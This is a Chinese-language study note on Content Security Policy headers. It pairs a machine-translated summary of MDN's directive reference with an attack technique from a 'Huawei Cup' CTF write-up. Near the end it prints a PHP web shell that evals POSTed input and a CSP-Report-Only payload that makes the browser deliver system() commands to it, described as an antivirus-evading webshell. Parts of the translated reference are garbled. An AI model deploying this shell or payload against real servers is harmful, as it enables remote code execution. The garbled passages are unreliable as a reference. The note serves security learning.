# SSRF之CSP策略

​	看了华为杯的WP以后，感觉这个点十分的新颖并且很有意思于是进行了相关内容的进一步学习和整理。

​	简单讲，CSP策略是一个额外的安全层，与其相关的http header主要有两个，一个是`Content-Security-Policy`,一个是`Content-Security-Policy-Report-Only`前者会阻止对违反CSP安全策略的资源的加载，而后者会将违规报告通过HTTP request post请求发送json文档到指定URI。

## 	 Syntax

```
Content-Security-Policy: <policy-directive>; <policy-directive>
Content-Security-Policy-Report-Only: <policy-directive>; <policy-directive>
```

## 	Directive(限制指令)

​	[Fetch 指令](https://developer.mozilla.org/en-US/docs/Glossary/Fetch_directive)控制可以从中加载某些资源类型的位置。

- [`child-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/child-src)

  定义使用 <[`frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame)和[``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) 等元素加载的[Web 辅助角色](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API)和嵌套浏览上下文的有效源。**警告：**而不是**`子源`**， 如果要调节嵌套浏览上下文和工作线程， 您应该分别使用[`Frame-SRC`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src)和[`worker-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/worker-src)指令。

- [`connect-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src)

  限制可以使用脚本接口加载的 URL

- [`default-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src)

  用作其他抓取的回[退 指令](https://developer.mozilla.org/en-US/docs/Glossary/Fetch_directive)。

- [`font-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/font-src)

  指定使用[`@font面`](https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face)加载的字体的有效源。

- [`frame-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src)

  指定使用[``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame)和[``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)等元素加载的嵌套浏览上下文的有效源。

- [`img-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/img-src)

  指定图像和收藏夹图标的有效来源。

- [`manifest-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/manifest-src)

  指定应用程序清单文件的有效源。

- [`media-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/media-src)

  指定使用 <audio>、<[`video`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/video)>and[``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/track)元素加载媒体的有效源。[``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/audio)

- [`object-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/object-src)

  为[`<对象>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object)，[``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed)指定有效的源， 和[`<小程序>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet)元素。**注意：**控制元素可能是 巧合地被认为是遗留的 HTML 元素，并且没有收到新的标准化 功能（例如安全属性或）。因此，**建议** 限制此获取指令（例如，显式设置如果 可能）。`object-src``sandbox``allow``<iframe>``object-src 'none'`

- [`prefetch-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/prefetch-src) 实验的

  指定要预取或预呈现的有效源。

- [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)

  指定 JavaScript 和 WebAssembly 资源的有效源。

- [`script-src-elem`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src-elem)

  指定 JavaScript[``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script)elements 的有效源。

- [`script-src-attr`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src-attr)

  指定 JavaScript 内联事件处理程序的有效源。

- [`style-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src)

  指定样式表的有效源。

- [`style-src-elem`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src-elem)

  指定样式表[`<样式>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/style)元素和[`<链接>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link)元素的有效源。`rel="stylesheet"`

- [`style-src-attr`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src-attr)

  指定应用于单个 DOM 元素的内联样式的有效源。

- [`worker-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/worker-src)

  指定工作线程、[`共享工作线程`](https://developer.mozilla.org/en-US/docs/Web/API/SharedWorker)或服务[`工作进程`](https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorker)脚本的有效源。

  ## Report directives（报告指令）

  * `report-uri`

  指示用户代理报告违反内容安全策略的尝试。 这些违规报告包含通过 HTTPrequest 发送到指定 URI 的[JSON](https://developer.mozilla.org/en-US/docs/Glossary/JSON)文档。`POST`

  ## Values

  下面列出了允许值的概述。 有关详细参考[，请参阅 CSP 源值](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources#sources)和各个指令的文档。

  ### Keyword values

  - `none`

    不允许加载任何资源。

  - `self`

    仅允许来自当前源的资源。

  - `strict-dynamic`

    由于随附的随机数或哈希而授予页面中脚本的信任将扩展到它加载的脚本。

  - `report-sample`

    要求在违规报告中包含违规代码的示例。

  ### Unsafe keyword values

  - `unsafe-inline`

    允许使用内联资源。

  - `unsafe-eval`

    允许使用动态代码评估，例如[`eval`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)，[`setImmediate`](https://developer.mozilla.org/en-US/docs/Web/API/Window/setImmediate) 非标和`window.execScript` 非标.

  - `unsafe-hashes`

    允许启用特定的内联事件处理程序。

  - `unsafe-allow-redirects` 实验的

    待定

  ### Hosts values

  - Host
    - 仅允许从特定主机加载资源，具有可选的方案、端口和路径。例如，`example.com``*.example.com``https://*.example.com:12/path/to/file.js`
    - CSP 中以它们作为前缀的任何路径结尾的路径部分。例如，将匹配网址。`/``example.com/api/``example.com/api/users/new`
    - CSP 中的其他路径部分完全匹配，例如将匹配，但不是`example.com/file.js``http://example.com/file.js``https://example.com/file.js``https://example.com/file.js/file2.js`
  - Scheme
    - 仅允许通过特定方案加载资源，应始终以“”结尾。例如，，等等。`:``https:``http:``data:`

  ### Other values

  - nonce-*

    允许脚本的加密随机数（仅使用一次）。服务器每次传输策略时都必须生成唯一的随机数值。提供无法猜测的随机数至关重要，因为绕过资源策略在其他方面是微不足道的。这与[脚本标记随机数属性](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-nonce)结合使用。例如`nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV`

  - sha*-*

    SHA256、SHA384 或 SHA512。后跟短划线，然后是 sha* 值。例如`sha256-jzgBGA4UWFFmpOBq0JpdsySukE1FrEN5bUpoK8Z29fY=`

  ```
  华为杯wp里面的
  报告json结构
  {
      "csp-report": {
          "document-uri": "http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26",
          "referrer": "",
          "violated-directive": "img-src",
          "effective-directive": "img-src",
          "original-policy": "img-src none; report-uri /shell.php;&bbzl's shell=system('touch /tmp/1');&",
          "disposition": "report",
          "blocked-uri": "http://124.221.138.51/img/1.jpg",
          "line-number": 2,
          "source-file": "http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26",
          "status-code": 200,
          "script-sample": ""
      }
  }
  shell.php:
  <?php
      $postdata = file_get_contents("php://input");
      $kv_list = explode('&',$postdata);
      var_dump($kv_list);
      if(count($kv_list)>0){
          foreach ($kv_list as $value){
              $kv = explode('=',$value);
              var_dump($kv);
              if(count($kv)==2){
                  if($kv[0]==="bbzl's shell"){
                      echo eval($kv[1]);
                  }
              }
          }
      }
  
  payload:
  Content-Security-Policy-Report-Only:img-src none; report-uri /flag.php;&bbzl's shell=system(mkdir success);&
  ```

  ![image-20221119184429487](D:\MDlearn\学习记录\md\SSRF之CSP策略.assets\image-20221119184429487.png)

​	通过查阅mdn文档，我们可以知道如何设置指定的policy-directive，由此，我们可以联想到，如果我们设置的policy和现有网页的预加载资源相冲突，那么就可以通过`Content-Security-Policy-Report-Only`的功能，来实现一个ssrf的效果，发送一个指定的post包。结合上传文件，可以起到一个webshell的作用，学到了一个新的免杀webshell的构造思路点。

​	推荐相关文章[Content Security Policy (CSP) 筆記 - HackMD](https://hackmd.io/@Eotones/BkOX6u5kX)

  文档链接 ：[Content-Security-Policy - HTTP | MDN (mozilla.org)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#examples)

[Content-Security-Policy-Report-Only - HTTP | MDN (mozilla.org)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only)

[内容安全策略 ( CSP ) - HTTP | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)





